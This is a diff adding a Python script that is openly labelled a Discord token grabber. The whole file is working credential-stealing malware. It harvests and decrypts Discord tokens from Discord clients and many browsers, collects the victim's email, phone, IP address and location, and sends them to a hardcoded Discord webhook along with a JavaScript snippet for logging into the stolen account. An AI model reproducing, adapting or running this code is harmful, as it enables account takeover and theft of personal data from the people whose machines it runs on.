@@ -1,0 +1,339 @@
+import os
+import urllib.request
+import json
+import base64
+import re
+import sqlite3
+import time
+import datetime
+from threading import Thread
+import subprocess
+import sys
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
+try:
+    from Crypto.Cipher import AES
+    import win32crypt
+    from colorama import Fore, init
+except ImportError:
+    class AES:
+        MODE_GCM = None
+        @staticmethod
+        def new(*args, **kwargs):
+            raise NotImplementedError("Crypto library not available")
+    class win32crypt:
+        @staticmethod
+        def CryptUnprotectData(*args, **kwargs):
+            raise NotImplementedError("win32crypt library not available")
+    class Fore:
+        GREEN = ""
+        RESET = ""
+    def init(autoreset=True):
+        pass
+
+init(autoreset=True)
+
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1496859632868790332/JIAxAjDnQlEKXrUunQI_J-DJrHF72Z4sCgB19Uzg-CdJnUKkdshxS7xCb7cSuEF2jSc2'
+
+shellmates = Fore.GREEN + """
+
+""" + Fore.RESET
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
+    'Iridium': LOCAL + '\\Iridium\\User Data',
+    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
+}
+
+def get_encryption_key(path):
+    local_state_path = os.path.join(path, "Local State")
+    if not os.path.exists(local_state_path):
+        return None
+    try:
+        with open(local_state_path, "r", encoding='utf-8') as f:
+            local_state = json.load(f)
+        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
+        if not encrypted_key_b64:
+            return None
+        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
+        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        return key
+    except Exception:
+        return None
+
+def decrypt_token(encrypted_token, key):
+    try:
+        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
+        iv = encrypted_token[3:15]
+        ciphertext = encrypted_token[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
+        return decrypted.decode(errors="ignore").strip()
+    except Exception:
+        return None
+
+def safe_storage_steal(path, platform):
+    tokens = []
+    key = get_encryption_key(os.path.dirname(path) if any(x in platform for x in ["Brave","Chrome","Edge","Opera","Vivaldi","Yandex","Amigo","Torch","Kometa","Orbitum","CentBrowser","7Star","Sputnik","Epic Privacy Browser","Uran","Iridium"]) else path)
+    if not key and any(x in platform for x in ["Brave","Chrome","Edge","Opera","Vivaldi","Yandex","Amigo","Torch","Kometa","Orbitum","CentBrowser","7Star","Sputnik","Epic Privacy Browser","Uran","Iridium"]):
+        return tokens
+    leveldb_paths = []
+    for root, dirs, _ in os.walk(path):
+        if "leveldb" in dirs:
+            leveldb_paths.append(os.path.join(root, "leveldb"))
+    if not leveldb_paths:
+        return tokens
+    for leveldb_path in leveldb_paths:
+        try:
+            for file_name in os.listdir(leveldb_path):
+                if not file_name.endswith((".log", ".ldb")):
+                    continue
+                file_path = os.path.join(leveldb_path, file_name)
+                with open(file_path, errors="ignore") as f:
+                    lines = f.readlines()
+                for line in lines:
+                    if line.strip():
+                        matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
+                        for match in matches:
+                            match = match.rstrip("\\")
+                            decrypted = decrypt_token(match, key) if key else None
+                            if decrypted and (decrypted, platform) not in tokens:
+                                tokens.append((decrypted, platform))
+        except Exception:
+            pass
+    return tokens
+
+def simple_steal(path, platform):
+    tokens = []
+    leveldb_paths = []
+    for root, dirs, _ in os.walk(path):
+        if "leveldb" in dirs:
+            leveldb_paths.append(os.path.join(root, "leveldb"))
+    if not leveldb_paths:
+        return tokens
+    for leveldb_path in leveldb_paths:
+        try:
+            for file_name in os.listdir(leveldb_path):
+                if not file_name.endswith((".log", ".ldb")):
+                    continue
+                file_path = os.path.join(leveldb_path, file_name)
+                with open(file_path, errors="ignore") as f:
+                    lines = f.readlines()
+                for line in lines:
+                    if line.strip():
+                        matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
+                        for match in matches:
+                            match = match.rstrip("\\").strip()
+                            if (match, platform) not in tokens:
+                                tokens.append((match, platform))
+        except Exception:
+            pass
+    return tokens
+
+def firefox_steal(path, platform):
+    tokens = []
+    sqlite_paths = []
+    for root, _, files in os.walk(path):
+        for file in files:
+            if file.lower().endswith(".sqlite"):
+                sqlite_paths.append(os.path.join(root, file))
+    if not sqlite_paths:
+        return tokens
+    for sqlite_path in sqlite_paths:
+        try:
+            with open(sqlite_path, errors="ignore") as f:
+                lines = f.readlines()
+            for line in lines:
+                if line.strip():
+                    matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
+                    for match in matches:
+                        match = match.rstrip("\\").strip()
+                        if (match, platform) not in tokens:
+                            tokens.append((match, platform))
+        except Exception:
+            pass
+    return tokens
+
+def steal_cookies(path, platform):
+    tokens = []
+    cookie_path = os.path.join(path, "Network", "Cookies")
+    if not os.path.exists(cookie_path):
+        return tokens
+    try:
+        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
+        conn.text_factory = bytes
+        cursor = conn.cursor()
+        cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'")
+        key = get_encryption_key(os.path.dirname(path))
+        for row in cursor.fetchall():
+            encrypted_value = row[0]
+            try:
+                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
+                decrypted = decrypted.strip()
+                if decrypted and re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", decrypted) and (decrypted, platform) not in tokens:
+                    tokens.append((decrypted, platform))
+            except Exception:
+                pass
+        conn.close()
+    except Exception:
+        pass
+    return tokens
+
+def get_tokens(platform, path):
+    tokens = []
+    if not os.path.exists(path):
+        return tokens
+    if "Firefox" in platform:
+        tokens.extend(firefox_steal(path, platform) or [])
+    else:
+        if any(x in platform for x in ["Brave","Chrome","Edge","Opera","Vivaldi","Yandex","Amigo","Torch","Kometa","Orbitum","CentBrowser","7Star","Sputnik","Epic Privacy Browser","Uran","Iridium"]):
+            profiles = ['Default'] + [f"Profile {i}" for i in range(1,10)]
+            for profile in profiles:
+                profile_path = os.path.join(path, profile)
+                if os.path.exists(profile_path):
+                    tokens.extend(safe_storage_steal(profile_path, f"{platform} ({profile})") or [])
+                    tokens.extend(simple_steal(profile_path, f"{platform} ({profile})") or [])
+                    tokens.extend(steal_cookies(profile_path, f"{platform} ({profile})") or [])
+        else:
+            tokens.extend(safe_storage_steal(path, platform) or [])
+            tokens.extend(simple_steal(path, platform) or [])
+    return tokens
+
+def get_headers(token=None):
+    headers = {"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+    if token:
+        headers["Authorization"] = token
+    return headers
+
+def get_ip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "Unavailable"
+
+def send_to_webhook(embed):
+    try:
+        data = json.dumps(embed, ensure_ascii=False).encode('utf-8')
+        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=get_headers(), method="POST")
+        with urllib.request.urlopen(req):
+            pass
+        time.sleep(1)
+    except:
+        pass
+
+def send_token_info(token, user_data, platform, ip):
+    try:
+        username = user_data.get('username','Unknown')
+        discriminator = user_data.get('discriminator','0')
+        badges = ""
+        flags = user_data.get('flags',0)
+        if flags & 64: badges += ":BadgeBravery: "
+        if flags & 128: badges += ":BadgeBrilliance: "
+        if flags & 256: badges += ":BadgeBalance: "
+        time1 = datetime.datetime.now(datetime.timezone.utc)
+        unix_timestamp = int(time1.timestamp())
+        url = "http://ipinfo.io/json"
+        responce = urllib.request.urlopen(url)
+        data = json.load(responce)
+        login = (
+            "function login(token) {\n"
+            "    setInterval(() => {\n"
+            '        document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = `"${token}"`;\n'
+            "    }, 50);\n"
+            "    setTimeout(() => { location.reload(); }, 2500);\n"
+            "}\n"
+            "login('" + str(token) + "');"
+        )
+        embed = {
+            "username": "LEO TOKEN GRABBER",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1460000685826510910/1460236959623680000/5f0528bb355baddf134d90e7ce045d11.jpg?ex=69662f25&is=6964dda5&hm=419b9066da720f4abd2ed709688e0ba6c6873555448cc99381e4fc16e2489d86&",
+            "allowed_mentions": {"parse": ["users"]},
+            "embeds": [{
+                "author": {"name":"LEO TOKEN GRABBER","icon_url":"https://cdn.discordapp.com/attachments/1460000685826510910/1460236959623680000/5f0528bb355baddf134d90e7ce045d11.jpg?ex=69662f25&is=6964dda5&hm=419b9066da720f4abd2ed709688e0ba6c6873555448cc99381e4fc16e2489d86&"},
+                "description": "> LEO ALWAYS WATCHING YOU | **WAG SUBUKAN ILEAK** | `Token Grabber Malware`",
+                "color": 16711680,
+                "image": {"url": f"https://cdn.discordapp.com/avatars/{user_data.get('id','0')}/{user_data.get('avatar','')}.png" if user_data.get('avatar') else ""},
+                "fields": [
+                    {"name":"𒈔 Victim's Discord","value":f"<@{user_data.get('id','N/A')}> | ```{username}```","inline":True},
+                    {"name":"𒈔 User ID","value":f"```{user_data.get('id','N/A')}```","inline":True},
+                    {"name":"𒈔 Email","value":f"```{user_data.get('email','N/A')}```","inline":True},
+                    {"name":"𒈔 Phone","value":f"```{str(user_data.get('phone','N/A'))}```","inline":True},
+                    {"name":"𒈔 Badges","value":badges or "None","inline":True},
+                    {"name":"𒈔 Platform","value":platform,"inline":True},
+                    {"name":"𒈔 IP Address","value":f"```{ip}```","inline":True},
+                    {"name":"𒈔 Address","value":f"[Google Maps](https://www.google.com/maps/search/google+map++{data['loc']})","inline":True},
+                    {"name":"𒈔 Time","value":f"<t:{unix_timestamp}:f>  <t:{unix_timestamp}:R>","inline":True},
+                    {"name":"𒈔 PC Username","value":f"```{os.getenv('USER', os.getenv('USERNAME', 'user'))}```","inline":True},
+                    {"name":"𒈔 Token","value":f"```{token}```","inline":False},
+                    {"name":"𒈔 Ready Token Login","value":f"```{login}```","inline":False},
+                    {"name":"𒈔 Profile Picture","value":"","inline":False}
+                ],
+                "footer":{"text":"/* LEO - Where there is a shell, there is a way */"}
+            }]
+        }
+        send_to_webhook(embed)
+    except Exception:
+        pass
+
+def main():
+    ip = get_ip()
+    found_tokens = []
+    threads = []
+    for platform, path in PATHS.items():
+        t = Thread(target=lambda p=platform, pt=path: found_tokens.extend(get_tokens(p, pt)))
+        t.start()
+        threads.append(t)
+    for thread in threads:
+        thread.join()
+    if not found_tokens:
+        return
+    unique_tokens = []
+    for token, platform in found_tokens:
+        if not re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", token):
+            continue
+        if token not in [t[0] for t in unique_tokens]:
+            try:
+                req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(token))
+                with urllib.request.urlopen(req) as response:
+                    if response.status == 200:
+                        user_data = json.loads(response.read().decode())
+                        unique_tokens.append((token, platform))
+                        send_token_info(token, user_data, platform, ip)
+            except Exception:
+                pass
+
+if __name__ == "__main__":
+    main()
